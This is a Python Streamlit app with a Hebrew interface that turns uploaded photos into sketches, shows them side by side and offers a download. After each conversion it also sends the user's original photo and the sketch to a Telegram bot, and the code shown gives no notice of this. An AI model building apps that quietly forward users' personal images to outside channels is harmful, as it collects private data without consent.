import asyncio
import os
from typing import Tuple
import streamlit as st
import cv2
import numpy as np
from PIL import Image
import io
from utils.BatchSketchApp import ImageToSketchProcessor
from utils.init import initialize
from utils.counter import initialize_user_count, increment_user_count, get_user_count
from utils.TelegramSender import TelegramSender

# Set page config at the very beginning
st.set_page_config(layout="wide", initial_sidebar_state="collapsed", page_title="מחולל תמונות AI", page_icon="📷")

# Initialize session state
if 'state' not in st.session_state:
    st.session_state.state = {
        'telegram_sender': TelegramSender(),
        'counted': False,
    }

async def send_telegram_message_and_file(message: str, original_image: Image.Image, sketch_image: Image.Image) -> None:
    sender = TelegramSender()
    try:
        if await sender.verify_bot_token():
            await sender.sketch_image(original_image, sketch_image, caption=message)
        else:
            raise Exception("Bot token verification failed")
    except Exception as e:
        raise Exception(f"Failed to send Telegram message: {str(e)}")
    finally:
        await sender.close_session()

def load_file_content(file_path: str) -> str:
    with open(file_path, 'r', encoding='utf-8') as file:
        return file.read()

def resize_image(image: Image.Image, max_width: int = 800) -> Image.Image:
    """Resize image to fit within max_width while maintaining aspect ratio"""
    w_percent = max_width / float(image.size[0])
    h_size = int(float(image.size[1]) * float(w_percent))
    return image.resize((max_width, h_size), Image.LANCZOS)

def process_image(file_bytes: bytes) -> Tuple[Image.Image, Image.Image]:
    image = Image.open(io.BytesIO(file_bytes))
    np_array = np.frombuffer(file_bytes, np.uint8)
    opencv_image = cv2.imdecode(np_array, cv2.IMREAD_COLOR)
    
    if opencv_image is None:
        raise ValueError("Failed to decode image with OpenCV. The file might be corrupted or in an unsupported format.")
    
    sketch = ImageToSketchProcessor.convert_to_sketch(opencv_image)
    sketch_image = Image.fromarray(sketch)
    
    return image, sketch_image

async def main():
    title, image_path, footer_content = initialize()
    st.title("המרה של תמונות לסקיצות אמנותיות")

    expander_html = load_file_content('expander.html')
    st.markdown(expander_html, unsafe_allow_html=True)
    
    uploaded_file = st.file_uploader("בחרו תמונה...", type=["jpg", "jpeg", "png"])
    
    if uploaded_file:
        try:
            file_bytes = uploaded_file.read()
            if not file_bytes:
                st.error("הקובץ שהועלה ריק. אנא נסה קובץ אחר.")
                return
            
            image, sketch_image = process_image(file_bytes)
            
            col1, col2 = st.columns(2)
            with col1:
                st.image(resize_image(image), caption="התמונה המקורית", use_column_width=True)
            with col2:
                st.image(resize_image(sketch_image), caption="הסקיצה", use_column_width=True)
            
            buffered = io.BytesIO()
            sketch_image.save(buffered, format="PNG")
            st.download_button(
                label="הורד סקיצה",
                data=buffered.getvalue(),
                file_name="sketch.png",
                mime="image/png"
            )
            
            await send_telegram_message_and_file("סקיצה של תמונה", image, sketch_image)
            
        except Exception as e:
            st.error(f"אירעה שגיאה בעיבוד התמונה: {str(e)}")
            st.error("אנא נסה להעלות תמונה אחרת או בדוק אם הקובץ פגום.")
    
    st.markdown(footer_content, unsafe_allow_html=True)
    user_count = get_user_count(formatted=True)
    st.markdown(f"<p class='user-count' style='color: #4B0082;'>סה\"כ משתמשים: {user_count}</p>", unsafe_allow_html=True)

if __name__ == "__main__":
    if not st.session_state.get('counted', False):
        st.session_state.counted = True
        increment_user_count()
    initialize_user_count()
    asyncio.run(main())